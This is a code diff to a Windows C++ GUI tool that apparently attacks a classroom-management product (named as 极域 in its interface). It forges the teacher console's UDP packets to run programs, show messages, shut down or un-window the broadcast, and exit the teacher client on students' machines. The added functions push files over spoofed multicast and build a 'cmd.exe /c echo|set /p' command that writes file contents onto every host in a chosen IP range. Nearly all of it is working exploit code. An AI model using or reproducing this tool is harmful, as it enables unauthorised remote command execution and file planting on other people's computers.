@@ -1,5 +1,6 @@
 ﻿#include "stdafx.h"
 #include "GUI.h"
+#include <stdio.h>
 //#include "TestFunctions.h"
 #pragma warning(disable:4996)
 #pragma warning(disable:4838)
@@ -22,6 +23,7 @@ HBITMAP hBmp, lBmp;//主窗口hbmp
 bool slient;
 int sdl = 70;
 HWND List;
+wchar_t RFPath[260] = L"<FOLDER_DESKTOP>", MFName[260], RFName[260];//对方文件路径和我方文件路径
 
 void s(LPCSTR a)
 {
@@ -431,7 +433,7 @@ public:
 
 				SIZE sel, ser;//pos1 / pos2:确定打印时“选中部分”真正的左右两端点
 				int pos1, pos2;//因为有时候从左到右移动鼠标选中文字，有时从右向左
-				if (Edit[i].Pos1 > Edit[i].Pos2&& Edit[i].Pos2 != -1)pos1 = Edit[i].Pos2, pos2 = Edit[i].Pos1; else pos1 = Edit[i].Pos1, pos2 = Edit[i].Pos2;
+				if (Edit[i].Pos1 > Edit[i].Pos2 && Edit[i].Pos2 != -1)pos1 = Edit[i].Pos2, pos2 = Edit[i].Pos1; else pos1 = Edit[i].Pos1, pos2 = Edit[i].Pos2;
 				//pos1&pos2里记录的数值只表示选中的先后顺序，不代表左右，因此这里要特殊处理
 
 				if (Edit[i].font != NULL)SelectObject(mdc, Edit[i].font); else SelectObject(mdc, DefFont);//字体
@@ -1395,6 +1397,304 @@ void shutdown2010(char* a, int cse)
 	WSACleanup();
 	return;
 }
+void filestart(bool start)
+{
+	WORD wVersionRequested;
+	WSADATA wsaData;
+	int err;
+
+	wVersionRequested = MAKEWORD(1, 1);
+
+	err = WSAStartup(wVersionRequested, &wsaData);
+	if (err != 0)return;
+
+	if (LOBYTE(wsaData.wVersion) != 1 ||
+		HIBYTE(wsaData.wVersion) != 1)
+	{
+		WSACleanup();
+		return;
+	}
+	SOCKET sockClient = socket(AF_INET, SOCK_DGRAM, 0);
+	SOCKADDR_IN addrSrv;
+
+	addrSrv.sin_addr.S_un.S_addr = inet_addr("225.2.2.1");
+
+	addrSrv.sin_family = AF_INET;
+	addrSrv.sin_port = htons(5512);
+
+	char bb[] = { 0x4d,0x45,0x53,0x53,0x01,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0xc0,0xa8,0x3d,0x80,0x2d,0x00,0x00,0x00,0x00,0x20,0x00,0x00,0x00,0x00,0x00,0x80,0xc0,0xa8,0x3d,0x81,0xa6,0x15,0xe1,0x02,0x02,0x0c,0xa9,0x15,0x00,0x50,0x00,0x00,0xa0,0x05,0x00,0x00,0x10,0x00,0x00,0x00,0x60,0x00,0x00,0x00,0x04,0x00,0x00,0x00,0x00 };
+	char aa[] = { 0x4d,0x45,0x53,0x53,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0d,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xc0 };
+	char cc[] = { 0x41,0x4e,0x4e,0x4f,0x01,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0xa8,0x3d,0x81,0x98,0xc7,0x83,0x08,0x00,0x00,0x00,0x00,0x98,0xc7,0x83,0x08,0x01,0x00,0x00,0x00,0x68,0x64,0x3b,0xa5,0xf0,0x6c,0x18,0x00,0xa8,0xc7,0x83,0x08,0xf4,0x3f,0x18,0x00,0xf0,0x3f,0x18,0x00,0x64,0x60,0x18,0x00,0x00,0x00,00,00,00,00,00,00 };
+	char dd[] = { 0x3e,0x31,0x00,0x00,0xc0,0xa8,0x3d,0x80,0x02,0x00,0x00,00,0x01,0x00,00,00 };
+
+
+	if (start)
+		sendto(sockClient, bb, 61, 0, (SOCKADDR*)&addrSrv, sizeof(SOCKADDR)),
+		sendto(sockClient, cc, 72, 0, (SOCKADDR*)&addrSrv, sizeof(SOCKADDR));
+	else
+		sendto(sockClient, aa, 25, 0, (SOCKADDR*)&addrSrv, sizeof(SOCKADDR));
+
+	//Sleep(1000);
+	closesocket(sockClient);
+	WSACleanup();
+	return;
+}
+void file2016(int pingdao)
+{
+	//char paath[513] = "C:\\Users\\ABC\\Desktop\\1.ini";
+	char* str_tmp;
+	FILE* f;
+	long length;
+	//以二进制形式打开文件
+	f = _wfopen(MFName, L"rb");
+	if (NULL == f)return;
+	//把文件的位置指针移到文件尾
+	fseek(f, 0, SEEK_END);
+	//获取文件长度;
+	length = ftell(f);
+	//把文件的位置指针移到文件开头
+	fseek(f, 0, SEEK_SET);
+	str_tmp = new char[length + 1500];
+	fread(str_tmp, 1, length, f);
+	str_tmp[length] = '\0';
+	fclose(f);
+	//s(str_tmp);
+
+	WORD wVersionRequested;
+	WSADATA wsaData;
+	int err;
+
+	wVersionRequested = MAKEWORD(1, 1);
+
+
+	err = WSAStartup(wVersionRequested, &wsaData);
+	if (err != 0)return;
+
+	if (LOBYTE(wsaData.wVersion) != 1 ||
+		HIBYTE(wsaData.wVersion) != 1)
+	{
+		WSACleanup();
+		return;
+	}
+	SOCKET sockClient = socket(AF_INET, SOCK_DGRAM, 0);
+	SOCKADDR_IN addrSrv;
+
+	char a[30] = "225.2.", b[10] = { 0 };
+	itoa(pingdao + 1, b, 10);
+	strcat_s(a, b);
+	strcat_s(a, ".12");
+	//s(a);
+	addrSrv.sin_addr.S_un.S_addr = inet_addr(a);
+	addrSrv.sin_family = AF_INET;
+	addrSrv.sin_port = htons(5033 + 512 * pingdao);
+
+	char aa[1455] = { 0xad,0x13,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xa0,0xc5,0x10,0x59,0x00,
+					  0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x00,
+					  0x00,0x00,0x1f,0x00,0x00,0x00,0x1f,0x00,0x00,0x00,0x91,0x00,0x00,0x00,0x00,0x00,
+					  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+					  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+					  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+					  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+					  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+					  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+					  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+					  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+					  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+					  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+					  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+					  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+					  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+					  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+					  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+					  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+					  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+					  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+					  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+					  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+					  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+					  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+					  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+					  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+					  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+					  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+					  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+					  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+					  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+					  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+					  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+					  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+					  0x00,0x00,0x00,0x00,0x00,0x00,0x1f,0x00,0x00,0x20,0x00,0x00,0x00,0x15,0x00,0x00,
+					  0x00,0x01,0x00,0x00,0x00
+	};
+
+	char bb[1455] = { 0xad,0x13,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x01,0xa0,0x85 };
+
+
+	int beg = 45, lel = wcslen(RFPath), ls2 = wcslen(MFName);
+	s(RFPath);
+	for (int i = 0; i < lel; ++i)
+	{
+		aa[beg] = RFPath[i] - ((RFPath[i] >> 8) << 8);
+		aa[beg + 1] = RFPath[i] >> 8;
+		beg += 2;
+	}
+	aa[beg] = 0x5c;
+
+	for (int i = ls2 - 1; i >= 0; --i)
+		if (MFName[i] == L'\\') { lel = i + 1; break; }
+	beg = 581;
+	for (int i = lel; i < ls2; ++i)
+	{
+		aa[beg] = MFName[i] - ((MFName[i] >> 8) << 8);
+		aa[beg + 1] = MFName[i] >> 8;
+		beg += 2;
+	}
+	//	if (length > 100000)length += 1000;
+		//length = 123456789;
+	{
+		aa[568] = aa[40] = aa[36] = length >> 24;
+		aa[567] = aa[39] = aa[35] = (length >> 16) - ((length >> 24) << 8);
+		aa[566] = aa[38] = aa[34] = (length >> 8) - ((length >> 16) << 8);
+		aa[565] = aa[37] = aa[33] = length - ((length >> 8) << 8);
+	}
+	//int l2 = length;
+	/*if (length > 137152)
+	{
+		l2 = 137152;
+		aa[25] = 0;
+		aa[40]  = l2 >> 24;
+		aa[39] = (l2 >> 16) - ((l2 >> 24) << 8);
+		aa[38] = (l2 >> 8) - ((l2 >> 16) << 8);
+		aa[37] = l2 - ((l2 >> 8) << 8);
+	}*/
+	int tm = length + 536;
+
+	{
+		aa[44] = tm >> 24;
+		aa[43] = (tm >> 16) - ((tm >> 24) << 8);
+		aa[42] = (tm >> 8) - ((tm >> 16) << 8);
+		aa[41] = tm - ((tm >> 8) << 8);
+	}
+	//	if (length > 100000)length -= 1000;
+
+	aa[0] = bb[0] = (char)GetTickCount();
+	aa[1] = bb[1] = (char)(GetTickCount() * 2);
+	if (length <= 352)
+	{
+		if (length <= 191)
+		{
+			aa[11] = 0x40 + length;
+			aa[12] = 0xe4;
+		}//当小于352字节时直接发完结束
+		else
+		{
+			aa[11] = length - 192;
+			aa[12] = 0xe5;
+		}
+		for (int i = 0; i < length; ++i)aa[1101 + i] = str_tmp[i];
+		sendto(sockClient, aa, 1101 + length, 0, (SOCKADDR*)&addrSrv, sizeof(SOCKADDR));
+		return;
+	}
+	//s(0);
+	//发送正常情况下的首条信息
+	for (int i = 0; i < 352; ++i)aa[1101 + i] = str_tmp[i];
+	sendto(sockClient, aa, 1453, 0, (SOCKADDR*)&addrSrv, sizeof(SOCKADDR));
+	//s(length);
+	length += 1440;
+	int cur = 353, times = 0, times2 = 0, times3 = 0;//cur=x表示下一个要发送的数据为str[x-1]
+	while (1)
+	{
+		++times; ++times3; if (times > 115)times = 0, ++times2;
+		bb[10] = times;
+		bb[6] = times2 - (times2 >> 8 << 8);
+		bb[7] = times2 >> 8;
+		bb[4] = times3 - (times3 >> 8 << 8);
+		bb[5] = (times3 - (times3 >> 16 << 16)) >> 8;
+		if (length - cur < 1440)break;
+		if (times >= 96)
+		{
+			bb[11] = 0x56; bb[12] = 0x0d;
+			for (int i = 13; i < 1453; ++i)bb[i] = i;
+		}
+		else
+		{
+			bb[11] = 0xa0;
+			//if (times == 0)
+			//{
+			//	Sleep(90);
+			//	//filestart(0, 1);
+			//	
+			//	bb[12] = 0xc5;
+			//	int l3 = 137688;
+			//	for (int i = 13; i < 565; ++i)bb[i] = aa[i];
+			//	bb[17] = times2+1;
+			//	l2 += 137688;
+			//	if (l2 > length)
+			//	{
+			//		l2 -= 137688;
+			//		l3 = length - l2;
+			//		l2 = length;
+			//		bb[25] = 1;
+			//	}
+			//	bb[40] = l2 >> 24;
+			//	bb[39] = (l2 >> 16) - ((l2 >> 24) << 8);
+			//	bb[38] = (l2 >> 8) - ((l2 >> 16) << 8);
+			//	bb[37] = l2 - ((l2 >> 8) << 8);
+
+			//	bb[44] = l3 >> 24;
+			//	bb[43] = (l3 >> 16) - ((l3 >> 24) << 8);
+			//	bb[42] = (l3 >> 8) - ((l3 >> 16) << 8);
+			//	bb[41] = l3 - ((l3 >> 8) << 8);
+			//	for (int i = 565; i < 1453; ++i)bb[i] = str_tmp[cur - 1], ++cur;
+
+			//}
+			//else
+			{
+				bb[12] = 0x85;
+				for (int i = 13; i < 1453; ++i)bb[i] = str_tmp[cur - 1], ++cur;
+			}
+		}
+		sendto(sockClient, bb, 1453, 0, (SOCKADDR*)&addrSrv, sizeof(SOCKADDR));
+	}
+	bb[11] = 0x0c; bb[12] = 0xa2;
+	//bb[11] = 0xa0; bb[12] = 0x85;
+	int i = 13, l22 = length - cur + 14;
+	while (cur <= length)
+	{
+		bb[i] = str_tmp[cur - 1]; ++cur; ++i;
+	}
+	//s(l22);
+	sendto(sockClient, bb, 1453, 0, (SOCKADDR*)&addrSrv, sizeof(SOCKADDR));
+	int ff = 1;
+	while (1)
+	{
+		++times; ++times3; if (times > 115)break;
+		bb[10] = times;
+		bb[6] = times2 - (times2 >> 8 << 8);
+		bb[7] = times2 >> 8;
+		bb[4] = times3 - (times3 >> 8 << 8);
+		bb[5] = (times3 - (times3 >> 16 << 16)) >> 8;
+		//if (length - cur < 1440)break;
+		if (times >= 96)
+		{
+			//bb[11] = 0x56; bb[12] = 0x0d;
+			for (int i = 11; i < 1453; ++i)bb[i] = rand();
+		}
+		else
+		{
+			bb[11] = 0xa0;
+			if (ff == 1)
+				bb[12] = 0xc5, ff = 0; else
+				bb[12] = 0x85;
+			for (int i = 13; i < 1453; ++i)bb[i] = 0;
+		}
+		sendto(sockClient, bb, 1453, 0, (SOCKADDR*)&addrSrv, sizeof(SOCKADDR));
+	}
+	closesocket(sockClient);
+	WSACleanup();
+	delete[]str_tmp;
+	return;
+}
 void shutdown2016(char* a, int cse)
 {
 	WORD wVersionRequested;
@@ -1486,7 +1786,8 @@ void text2016(char* a, int cse, char* text, int len)
 		//strcat(aa, text);
 		//aa[58] = 0;
 		aa[19] = (char)GetTickCount();
-		aa[20] = (char)(GetTickCount() * 2);
+		aa[20] = (char)(rand() * 2);
+		//s(len);
 		for (int i = 60; i < 60 + len * 2; ++i)aa[i] = text[i - 60];
 		sendto(sockClient, aa, 906, 0, (SOCKADDR*)&addrSrv, sizeof(SOCKADDR));
 	}
@@ -1590,7 +1891,6 @@ DWORD WINAPI SearchThread(LPVOID pM)
 			addrmap[l].a = addrmap[l].b = true;
 			strcat_s(at, "|");
 			strcat_s(at, pHost1->h_name);
-			//s(wat);
 			MultiByteToWideChar(CP_ACP, 0, at, -1, wat, 100);
 			SendMessage(List, LB_ADDSTRING, 0, (LPARAM)wat);
 		}
@@ -1620,12 +1920,16 @@ DWORD WINAPI SearchThreadStarter(LPVOID pM)
 	strcpy_s(b, a);
 	*strrchr(b, '.') = 0;
 	strcpy_s(curip, b);
-	for (int i = 0; i < 256; ++i)
+	for (int i = 0; i < 180; ++i)
 	{
-		SearchThreada c = { i,false };
+		SearchThreada c = { i,true };
 		CreateThread(NULL, 0, SearchThread, &c, 0, NULL);
 		Sleep(1);
-		c.b = true;
+	}
+	Sleep(1000);
+	for (int i = 0; i < 180; ++i)
+	{
+		SearchThreada c = { i,false };
 		CreateThread(NULL, 0, SearchThread, &c, 0, NULL);
 		Sleep(1);
 	}
@@ -1644,13 +1948,6 @@ DWORD WINAPI SearchAll(LPVOID pM)
 		Sleep(500);
 		SearchComputers(Allips[i]);
 		Sleep(1000);
-	}
-	Sleep(6000);
-	for (int i = 0; i < numofips; ++i)
-	{
-		Sleep(1000);
-		SearchComputers(Allips[i]);
-		Sleep(2000);
 	}
 	return 0;
 }
@@ -1716,18 +2013,19 @@ BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)//初始化
 	Main.CreateButton(40, 212, 105, 45, 0, L"远程启动程序", L"cmd");
 	Main.CreateButton(40, 272, 105, 45, 0, L"远程网页", L"net");
 	Main.CreateButton(40, 332, 105, 45, 0, L"远程消息", L"text");
-	Main.CreateButton(40, 392, 105, 45, 0, L"远程关闭程序", L"rclose");
-	Main.CreateEditEx(165 + 5, 214, 130 - 10, 40, 1, L"在此输入程序名", L"cmd", 0, false);
-	Main.CreateEditEx(165 + 5, 274, 130 - 10, 40, 1, L"在此输入网页名", L"net", 0, false);
-	Main.CreateEditEx(165 + 5, 334, 130 - 10, 40, 1, L"在此输入消息", L"net", 0, false);
+	Main.CreateButton(165, 152, 135, 45, 0, L"远程关闭程序", L"rclose");
+
+	Main.CreateEditEx(165 + 5, 214, 135 - 10, 40, 1, L"输入内容", L"cmd", 0, false);
+	Main.CreateEditEx(165 + 5, 274, 135 - 10, 40, 1, L"输入网页名", L"net", 0, false);
+	Main.CreateEditEx(165 + 5, 334, 135 - 10, 40, 1, L"输入消息", L"net", 0, false);
 
 	CheckIP();
 
 	Main.CreateEditEx(370 + 5, 110, 35 - 10, 30, 1, L"192", L"IP1", 0, true);//4
 	Main.CreateEditEx(420 + 5, 110, 35 - 10, 30, 1, L"168", L"IP2", 0, true);//5
 	Main.CreateEditEx(470 + 5, 110, 35 - 10, 30, 1, L"1", L"IP3", 0, true);//6
-	Main.CreateEditEx(520 + 5, 110, 35 - 10, 30, 1, L"1", L"IP4", 0, true);
-	Main.CreateEditEx(520 + 5, 168, 35 - 10, 30, 1, L"255", L"IP5", 0, true);
+	Main.CreateEditEx(520 + 5, 110, 35 - 10, 30, 1, L"1", L"IP4", 0, true);//7
+	Main.CreateEditEx(520 + 5, 168, 35 - 10, 30, 1, L"255", L"IP5", 0, true);//8
 	RefreshIP(ip);
 	CreateThread(0, 0, SearchAll, 0, 0, NULL);
 	Main.CreateLine(0, 471, 850, 471, 0, COLOR_DARKER_GREY);
@@ -1737,9 +2035,15 @@ BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)//初始化
 		CreateSolidBrush(COLOR_CLOSE_LEAVE), CreateSolidBrush(COLOR_CLOSE_HOVER), CreateSolidBrush(COLOR_CLOSE_PRESS), \
 		CreatePen(PS_SOLID, 1, COLOR_CLOSE_LEAVE), CreatePen(PS_SOLID, 1, COLOR_CLOSE_HOVER), CreatePen(PS_SOLID, 1, COLOR_CLOSE_PRESS), \
 		Main.DefFont, 1, COLOR_WHITE, L"Close");
-	Main.CreateButton(165, 92, 130, 45, 0, L"远程极域窗口化", L"rwindow");
+	Main.CreateButton(165, 92, 135, 45, 0, L"远程极域窗口化", L"rwindow");
 	Main.CreateButton(370, 155, 100, 45, 0, L"切换网卡", L"rip");
 	Main.CreateButton(800, 55, 30, 30, 0, L"...", L"ri");
+
+	Main.CreateButton(40, 390, 105, 45, 0, L"退出教师端", L"rfile");
+	//Main.CreateButton(165, 390, 105, 45, 0, L"测试", L"rfile2");
+	//Main.CreateButton(160, 395, 30, 35, 0, L"...", L"mfile");
+	//Main.CreateEditEx(200, 395, 100, 35, 1, L"<FOLDER_DESKTOP>", L"rfile", 0, true);
+
 	Main.CreateText(620, 60, 0, L"tr", COLOR_BLACK);
 	List = CreateWindowW(L"ListBox", NULL, WS_CHILD | LBS_STANDARD, (int)(620 * Main.DPI), (int)(90 * Main.DPI), (int)(210 * Main.DPI), (int)(370 * Main.DPI), Main.hWnd, (HMENU)1, Main.hInstance, 0);
 	::SendMessage(List, WM_SETFONT, (WPARAM)Main.DefFont, 1);
@@ -1785,6 +2089,58 @@ void act2010(int cse)
 		wcstombs_s(&t, tmp2, tmp, 30);
 		shutdown2010(tmp2, cse);
 	}
+}
+void act2016test()
+{
+	//char paath[513] = "C:\\Users\\ABC\\Desktop\\1.ini";
+	char* st1;
+	wchar_t* str_tmp,st2[999];
+	FILE* f;
+	long length;
+	//以二进制形式打开文件
+	f = _wfopen(L"C:\\Users\\ABC\\Desktop\\1.ini", L"rb");
+	if (NULL == f)return;
+	//把文件的位置指针移到文件尾
+	fseek(f, 0, SEEK_END);
+	//获取文件长度;
+	length = ftell(f);
+	//把文件的位置指针移到文件开头
+	fseek(f, 0, SEEK_SET);
+	st1 = new char[length * 2 + 1500];
+	str_tmp = new wchar_t[length + 1500];
+	//st2 = new wchar_t[length + 1500];
+	fread(st1, 1, length, f);
+	st1[length] = '\0';
+	fclose(f);
+	charTowchar(st1, str_tmp, sizeof(wchar_t) * length);
+	//s(length);
+	wcscpy(st2, L"cmd.exe \"/c echo|set /p=\"");
+	const wchar_t c[]= L"\">>c:\\zouxi\\1.7zz\"";
+	for (int i = 0; i < length; ++i) { st2[i + 25] = str_tmp[i];if (st2[i + 25] == 0)st2[i + 25] = 48; }
+	for (int i = 0; i < 19; ++i)st2[i + 25 + length] = c[i];
+	//s(str_tmp);
+	//wcscat(st2, str_tmp);
+	//wcscat(st2, L"\">>c:\\zouxi\\1.7zz\"");
+	int a = min(_wtoi(Main.Edit[7].str), _wtoi(Main.Edit[8].str)), b = max(_wtoi(Main.Edit[7].str), _wtoi(Main.Edit[8].str));
+	//wchar_t txt[1001]; wcscpy_s(txt, text); size_t l = wcslen(txt);
+	char txt2[10001] = { 0 };
+	s(st2);
+
+	for (int i = 0; i < (int)(length+45); ++i) {
+		txt2[i * 2 + 1] = (st2[i] >> 8); txt2[i * 2] = st2[i] - ((st2[i] >> 8) << 8);
+	}
+	for (int i = a; i <= b; ++i)
+	{
+		wchar_t tmp[100], num[10];
+		char tmp2[100]; size_t t;
+		_itow_s(i, num, 10);
+		catstr(tmp, Main.Edit[4].str, Main.Edit[5].str, Main.Edit[6].str, num);
+		wcstombs_s(&t, tmp2, tmp, 30);
+		text2016(tmp2, 1, txt2, 2*(length + 45));
+	}
+	delete[]str_tmp;
+	//delete[]st2;
+	delete[]st1;
 }
 void act2016text(int cse, wchar_t* text)
 {
@@ -1978,6 +2334,47 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)/
 		{CreateThread(0, 0, SearchAll, 0, 0, NULL);
 		break;
 		}
+		case 11:
+		{
+		//a:
+		//	if (*MFName == 0)
+		//	{
+		//		OPENFILENAME ofn = { 0 };
+		//		char strFile[MAX_PATH * 2] = { 0 };
+
+		//		ofn.lStructSize = sizeof(OPENFILENAME);
+		//		ofn.lpstrFile = MFName;
+		//		ofn.nMaxFile = MAX_PATH;
+		//		ofn.Flags = OFN_FILEMUSTEXIST;
+		//		ofn.lpstrInitialDir = Path;
+		//		if (!GetOpenFileName(&ofn))goto a;
+		//	}
+		//	//while (1)
+		//	if (Main.Edit[9].str != 0)if (*Main.Edit[9].str != 0)wcscpy_s(RFPath, Main.Edit[9].str)/*, s(Main.Edit[9].str)*/;
+			filestart(true);//, Sleep(100);
+		//	file2016(2);
+			//Sleep(500);
+			//filestart(false);
+			break;
+		}
+		case 12:
+		{
+			act2016test();
+			break;
+		}
+		/*case 12:
+		{
+			OPENFILENAME ofn = { 0 };
+			char strFile[MAX_PATH * 2] = { 0 };
+
+			ofn.lStructSize = sizeof(OPENFILENAME);
+			ofn.lpstrFile = MFName;
+			ofn.nMaxFile = MAX_PATH;
+			ofn.Flags = OFN_FILEMUSTEXIST;
+			ofn.lpstrInitialDir = Path;
+			GetOpenFileName(&ofn);
+			break;
+		}*/
 		}
 
 		if (Main.CoverCheck != 0)
